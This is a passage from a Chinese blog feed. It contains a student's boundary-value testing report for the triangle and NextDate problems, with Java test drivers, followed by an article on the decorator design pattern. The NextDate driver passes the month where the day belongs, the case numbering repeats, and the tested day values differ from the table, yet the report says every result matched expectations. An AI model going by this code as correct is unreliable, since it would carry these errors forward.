title="运行示例"></a>运行示例</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219094219.png"></p><h2 id="【测试用例设计及分析】"><a href="#【测试用例设计及分析】" class="headerlink" title="【测试用例设计及分析】"></a>【测试用例设计及分析】</h2><h3 id="三角形问题：测试用例"><a href="#三角形问题：测试用例" class="headerlink" title="三角形问题：测试用例"></a>三角形问题：测试用例</h3><p>我们选择最常用的弱健壮测试，设计以下设计用例：<br>对于三角形问题，分别需要取的（边界）值:</p><table><thead><tr><th>Var</th><th>Min</th><th>Min-</th><th>Min+</th><th>Nom</th><th>Max-</th><th>Max</th><th>Max+</th></tr></thead><tbody><tr><td>a</td><td>1</td><td>0</td><td>2</td><td>50</td><td>99</td><td>100</td><td>101</td></tr><tr><td>b</td><td>1</td><td>0</td><td>2</td><td>50</td><td>99</td><td>100</td><td>101</td></tr><tr><td>c</td><td>1</td><td>0</td><td>2</td><td>50</td><td>99</td><td>100</td><td>101</td></tr></tbody></table><p>以下为弱健壮测试用例表：  </p><p>对边a</p><table><thead><tr><th>测试用例编号</th><th>a</th><th>b</th><th>c</th><th>类型</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>50</td><td>50</td><td>Min</td></tr><tr><td>1</td><td>0</td><td>50</td><td>50</td><td>Min-</td></tr><tr><td>2</td><td>2</td><td>50</td><td>50</td><td>Min+</td></tr><tr><td>3</td><td>50</td><td>50</td><td>50</td><td>Nom</td></tr><tr><td>4</td><td>99</td><td>50</td><td>50</td><td>Max-</td></tr><tr><td>5</td><td>100</td><td>50</td><td>50</td><td>Max</td></tr><tr><td>6</td><td>101</td><td>50</td><td>50</td><td>Max+</td></tr></tbody></table><p>对边b</p><table><thead><tr><th>测试用例编号</th><th>a</th><th>b</th><th>c</th><th>类型</th></tr></thead><tbody><tr><td>7</td><td>50</td><td>1</td><td>50</td><td>Min</td></tr><tr><td>8</td><td>50</td><td>0</td><td>50</td><td>Min-</td></tr><tr><td>9</td><td>50</td><td>2</td><td>50</td><td>Min+</td></tr><tr><td>10</td><td>50</td><td>99</td><td>50</td><td>Max-</td></tr><tr><td>11</td><td>50</td><td>100</td><td>50</td><td>Max</td></tr><tr><td>12</td><td>50</td><td>101</td><td>50</td><td>Max+</td></tr></tbody></table><p>对边c</p><table><thead><tr><th>测试用例编号</th><th>a</th><th>b</th><th>c</th><th>类型</th></tr></thead><tbody><tr><td>7</td><td>50</td><td>50</td><td>1</td><td>Min</td></tr><tr><td>8</td><td>50</td><td>50</td><td>0</td><td>Min-</td></tr><tr><td>9</td><td>50</td><td>50</td><td>2</td><td>Min+</td></tr><tr><td>10</td><td>50</td><td>50</td><td>99</td><td>Max-</td></tr><tr><td>11</td><td>50</td><td>50</td><td>100</td><td>Max</td></tr><tr><td>12</td><td>50</td><td>50</td><td>101</td><td>Max+</td></tr></tbody></table><p>以上是对变量a，对变量b, c测试用例相同，不再重复列举。根据公式，弱健壮测试用例数为: 6*n+1，19，和上表相同。</p><h3 id="NextDate：测试用例"><a href="#NextDate：测试用例" class="headerlink" title="NextDate：测试用例"></a>NextDate：测试用例</h3><p>对于NextDate问题，分别需要取的（边界）值</p><table><thead><tr><th>Var</th><th>Min</th><th>Min-</th><th>Min+</th><th>Nom</th><th>Max-</th><th>Max</th><th>Max+</th></tr></thead><tbody><tr><td>c1(Month，月)</td><td>1</td><td>0</td><td>2</td><td>6</td><td>11</td><td>12</td><td>13</td></tr><tr><td>c2(Day，日)</td><td>1</td><td>0</td><td>2</td><td>15</td><td>30</td><td>31</td><td>32</td></tr><tr><td>c3(YEAR，年)</td><td>1912</td><td>1911</td><td>1913</td><td>1981</td><td>2049</td><td>2050</td><td>2051</td></tr></tbody></table><p>以下为弱健壮测试用例表：<br>对c1:</p><table><thead><tr><th>测试用例编号</th><th>c1</th><th>c2</th><th>c3</th><th>类型</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>15</td><td>1981</td><td>Min</td></tr><tr><td>1</td><td>0</td><td>15</td><td>1981</td><td>Min-</td></tr><tr><td>2</td><td>2</td><td>15</td><td>1981</td><td>Min+</td></tr><tr><td>3</td><td>6</td><td>15</td><td>1981</td><td>Nom</td></tr><tr><td>4</td><td>11</td><td>15</td><td>1981</td><td>Max-</td></tr><tr><td>5</td><td>12</td><td>15</td><td>1981</td><td>Max</td></tr><tr><td>6</td><td>13</td><td>15</td><td>1981</td><td>Max+</td></tr></tbody></table><p>对c2:</p><table><thead><tr><th>测试用例编号</th><th>c1</th><th>c2</th><th>c3</th><th>类型</th></tr></thead><tbody><tr><td>7</td><td>6</td><td>1</td><td>1981</td><td>Min</td></tr><tr><td>8</td><td>6</td><td>0</td><td>1981</td><td>Min-</td></tr><tr><td>9</td><td>6</td><td>2</td><td>1981</td><td>Min+</td></tr><tr><td>10</td><td>6</td><td>29</td><td>1981</td><td>Max-</td></tr><tr><td>11</td><td>6</td><td>30</td><td>1981</td><td>Max</td></tr><tr><td>12</td><td>6</td><td>31</td><td>1981</td><td>Max+</td></tr></tbody></table><p>对c3</p><table><thead><tr><th>测试用例编号</th><th>c1</th><th>c2</th><th>c3</th><th>类型</th></tr></thead><tbody><tr><td>13</td><td>6</td><td>15</td><td>1912</td><td>Min</td></tr><tr><td>14</td><td>6</td><td>15</td><td>1911</td><td>Min-</td></tr><tr><td>15</td><td>6</td><td>15</td><td>1913</td><td>Min+</td></tr><tr><td>16</td><td>6</td><td>15</td><td>2049</td><td>Max-</td></tr><tr><td>17</td><td>6</td><td>15</td><td>2050</td><td>Max</td></tr><tr><td>18</td><td>6</td><td>15</td><td>2051</td><td>Max+</td></tr></tbody></table><p>根据公式，弱健壮测试用例数为: 6*n+1，该案例的测试用例数为19，符合上表。</p><h2 id="【测试结果及分析】"><a href="#【测试结果及分析】" class="headerlink" title="【测试结果及分析】"></a>【测试结果及分析】</h2><p>在编写实验代码时，我使用的面向对象的编程方法，将输入、判断、输出都封装成了一个类<code>TriangleProc</code>。因此，编写测试类时，可以更加容易地实例化对象，调用对象中的方法进行测试。并且测试的方式、顺序、组合都会更灵活。</p><h3 id="三角形问题：使用测试类进行测试"><a href="#三角形问题：使用测试类进行测试" class="headerlink" title="三角形问题：使用测试类进行测试"></a>三角形问题：使用测试类进行测试</h3><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.TriangleProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleTesting_one</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] sideAList = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">50</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">101</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] sideBList = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">50</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] sideCList = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">50</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> sideA : sideAList) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> sideB : sideBList) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> sideC : sideCList) &#123;</span><br><span class="line">                    triangleProc.sideA = sideA;</span><br><span class="line">                    triangleProc.sideB = sideB;</span><br><span class="line">                    triangleProc.sideC = sideC;</span><br><span class="line"></span><br><span class="line">                    triangleProc.verifyLengthRange(triangleProc.sideA);</span><br><span class="line">                    triangleProc.verifyLengthRange(triangleProc.sideB);</span><br><span class="line">                    triangleProc.verifyLengthRange(triangleProc.sideC);</span><br><span class="line"></span><br><span class="line">                    triangleProc.verifyFormPrinciple(triangleProc);</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">"三角形类型为："</span> + triangleProc.judgeTriangleType(triangleProc));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219092143.png"><br>满足预期</p><h3 id="三角形问题：手动输入测试"><a href="#三角形问题：手动输入测试" class="headerlink" title="三角形问题：手动输入测试"></a>三角形问题：手动输入测试</h3><p>测试用例0:<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219083631.png"></p><p>符合预期。</p><p>测试用例1:  </p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219083808.png"><br>符合预期。</p><p>测试用例2:<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219083950.png"><br>符合预期。</p><p>测试用例3:<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219084023.png"><br>符合预期。</p><p>测试用例4:<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219084244.png"><br>符合预期。</p><p>测试用例5:<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219084329.png"><br>符合预期。</p><p>测试用例6:<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219084359.png"><br>符合预期。</p><p>对于三角形测试，我们主要关注于两个验证函数：验证三角形两边之和大于第三边；验证三角形边的长度范围，以长度为变量，测试边界范围的值。</p><h3 id="NextDate-使用测试类进行测试"><a href="#NextDate-使用测试类进行测试" class="headerlink" title="NextDate: 使用测试类进行测试"></a>NextDate: 使用测试类进行测试</h3><h4 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.NextDate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NextDateTesting_one</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 驱动模块</span></span><br><span class="line"><span class="comment">     * 函数：dateCheckFunction</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nextDate</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dateCheckFunction</span><span class="params">(NextDate nextDate, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (year &gt;= <span class="number">1912</span> &amp;&amp; year &lt;= <span class="number">2050</span>) &#123;</span><br><span class="line">            nextDate.year = year;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The YEAR is out of range"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (month &gt;= <span class="number">1</span> &amp;&amp; month &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">            nextDate.month = month;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The MONTH is out of range"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (day &gt;= <span class="number">1</span> &amp;&amp; day &lt;= <span class="number">31</span>) &#123;</span><br><span class="line">            nextDate.day = day;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The DAY is out of range"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        NextDate nextDate = <span class="keyword">new</span> NextDate();</span><br><span class="line">        NextDateTesting_one nextDateTesting_one = <span class="keyword">new</span> NextDateTesting_one();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] yearList = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1912</span>, <span class="number">1911</span>, <span class="number">1913</span>, <span class="number">2049</span>, <span class="number">2050</span>, <span class="number">2051</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] monthList = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] dayList = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> nomYear = <span class="number">1981</span>;</span><br><span class="line">        <span class="keyword">int</span> nomMonth = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">int</span> nomDay = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 对year的弱健壮测试</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> year : yearList) &#123;</span><br><span class="line">            <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">            nextDateTesting_one.dateCheckFunction(nextDate, year, nomMonth, nomDay);</span><br><span class="line">            <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">            String dayAfter = nextDate.nextDateFunction(nextDate.year,</span><br><span class="line">                    nextDate.month, nextDate.day);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 对month的弱健壮测试</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> month : monthList) &#123;</span><br><span class="line">            <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">            nextDateTesting_one.dateCheckFunction(nextDate, nomYear, month, nomDay);</span><br><span class="line">            <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">            String dayAfter = nextDate.nextDateFunction(nextDate.year,</span><br><span class="line">                    nextDate.month, nextDate.month);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 对day的弱健壮测试</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> day : dayList) &#123;</span><br><span class="line">            <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">            nextDateTesting_one.dateCheckFunction(nextDate, nomYear, nomMonth, day);</span><br><span class="line">            <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">            String dayAfter = nextDate.nextDateFunction(nextDate.year,</span><br><span class="line">                    nextDate.month, nextDate.month);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="输入结果"><a href="#输入结果" class="headerlink" title="输入结果"></a>输入结果</h4><p>在上述的测试代码中，分别对Year、Month和Day进行弱健壮测试，输出的结果和测试用例设计时的预期相符：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219114009.png"></p><h2 id="【实验总结】"><a href="#【实验总结】" class="headerlink" title="【实验总结】"></a>【实验总结】</h2><p>在实际编程环境中，会遇到很多边界值，因此边界值测试可以很好地检查这些易出错的点上，系统的鲁棒性。<br>面向对象的编程，也会更好地帮助测试，会使得测试代码的编写更容易，实现高内聚，低耦合。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 开发 </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】设计模式——装饰器模式</title>
      <link href="/2019/12/14//articles/2019/12/14/1576297118833.html/"/>
      <url>/2019/12/14//articles/2019/12/14/1576297118833.html/</url>
      
        <content type="html"><![CDATA[<h1 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h1><h2 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>有时需要在现有代码中添加或删除一些功能，同时对现有的代码结构不会造成影响，并且这些删除或者增加的功能又不足以做成一个子类。这种情况下装饰器模式就会派上用场，因为它能够在不改变现有代码的情况下满足我们的需求。  </p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>装饰器聚合了它将要装饰的原有对象，实现了与原有对象相同的接口，代理委托原有对象的所有公共接口调用，并且在子类中实现新增的功能，从而达到上述目的。  </p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>装饰器模式的目的是动态扩展现有对象的功能而不更改原有代码。它能够适配原始接口，并且使用组合而不是子类化来扩展功能。</p><h2 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h2><p>装饰器可以递归使用，它可以应用于现有组件的实现，同时也能被另一个装饰引用，甚至自己引用自己。装饰器接口并不固定于组件接口，可以添加额外的方法，且可以由装饰器的子类使用。<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213214910.png" alt="装饰器模式实现示意图"><br>图：装饰器模式实现示意图<br>注：</p><ul><li>Component：抽象组件（它可以是一个接口）</li><li>ComponentImplementation：想装饰的组件之一</li><li>Decorator：一个抽象的组件装饰器</li><li>ExtendedComponent：添加额外功能的组件装饰器</li></ul><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>以下代码展示了如何将一个简单打印ASCII文本的功能，扩展到既能打印ASCII文本又能转换为十六进制字符串输出的功能。  </p><p>原先代码，只具有打印ASCII文本的功能，使用装饰器，使得原先的功能也可用于打印十六进制代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> java.lang.Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"text"</span>;</span><br><span class="line"><span class="keyword">final</span> PrintText object = <span class="keyword">new</span> PrintAsciiText();</span><br><span class="line"><span class="comment">// 使用装饰器，使得原先的功能也可用于打印十六进制代码</span></span><br><span class="line"><span class="keyword">final</span> PrintText printer = <span class="keyword">new</span> PrintTextHexDecorator(object);</span><br><span class="line"></span><br><span class="line">object.print(text);</span><br><span class="line">printer.print(text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PrintText</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String text)</span></span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrintAsciiText</span> <span class="keyword">implements</span> <span class="title">PrintText</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Print ASCII: "</span> + text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>装饰器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrintTextHexDecorator</span> <span class="keyword">implements</span> <span class="title">PrintText</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> PrintText inner;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PrintTextHexDecorator</span><span class="params">(PrintText inner)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.inner = inner;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">String hex = text.chars()</span><br><span class="line">.boxed()</span><br><span class="line">        .map(x -&gt; <span class="string">"0x"</span> + Integer.toHexString(x))</span><br><span class="line"> .collect(Collectors.joining(<span class="string">" "</span>));</span><br><span class="line">inner.print(text + <span class="string">" -&gt; HEX: "</span> + hex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点:"></a>优点:</h3><ol><li>我们知道通过继承的方式可以扩展一个父类的功能，但是我们想想，如果每一个新需求进来我们就创建一个类的子类来扩展其功能，当工程越来越大之后，类的数量将急剧上升，类之间的继承关系也变得错中复杂，这使得代码维护难度越来越大，代码间的耦合度越来越高。<br>采用装饰器模式之后，我们想增加一个功能，只需要继承Decorator类即可。使用独立的装饰器，来起到降低耦合的作用</li><li>装饰类和被装饰类可以独立发展，而不会相互耦合。换句话说，Component类无须知道Decorator类，Decorator类是从外部来扩展Component类的功能，而Decorator也不用知道具体的构件</li><li>装饰模式是继承关系的一个替代方案。我们看装饰类Decorator，不管装饰多少层，返回的对象还是Component，实现的还是is-a的关系  </li><li>装饰模式与继承关系的目的都是要<strong>扩展对象</strong>的功能，但是装饰模式可以提供比继承更多的灵活性。<strong>装饰模式允许系统动态决定“贴上”一个需要的“装饰”</strong>，或者除掉一个不需要的“装饰”。继承关系则不同，继承关系是静态的，它在系统运行前就决定了  </li><li>过使用不同的具体装饰类以及这些装饰类的排列组合，设计师可以创造出很多不同行为的组合。</li></ol><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><ol><li>由于使用装饰模式，可以比使用继承关系需要较少数目的类。使用较少的类，当然使设计比较易于进行。但是，在另一方面，<strong>使用装饰模式会产生比使用继承关系更多的对象</strong>。更多的对象会使得查错变得困难，特别是这些对象看上去都很相像</li><li>多层的装饰比较复杂</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>简单来说，就是用多创建几个相对独立的类的方式，降低继承带来的耦合度升高。优势在于更佳灵活、动态、简易。但缺点是在重量级类的编写中，会比继承关系产生更多的对象，在管理、查错以及多重装饰时显得复杂。  </p><p>Flask就是采用这个模式，因此Flask也相对适合快速开发一些轻量级应用。</p><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ol><li>一般将此模式应用于具有<strong>轻量级接口的类</strong>。</li><li>装饰器模式另一种不错的应用方式是<strong>将期望的策略注入组件（策略模式</strong>），从而扩展功能。这只对特定方法进行局部的改变，而不需要重新实现一个新的方法。</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] 卡马尔米特·辛格（Kamalmeet Singh）. Java设计模式及实践 (Java核心技术系列) (Chinese Edition) (Kindle Locations 971-972). Kindle Edition.   </p><p>[2] 拥抱心中的梦想. 装饰器设计模式. <a href="https://juejin.im/post/5b165c03f265da6e5c3c1be8" target="_blank" rel="noopener">https://juejin.im/post/5b165c03f265da6e5c3c1be8</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 软件工程 </tag>
            
            <tag> 结构与设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】设计模式——单例模式</title>
      <link href="/2019/12/13//articles/2019/12/13/1576243895982.html/"/>
      <url>/2019/12/13//articles/2019/12/13/1576243895982.html/</url>
      
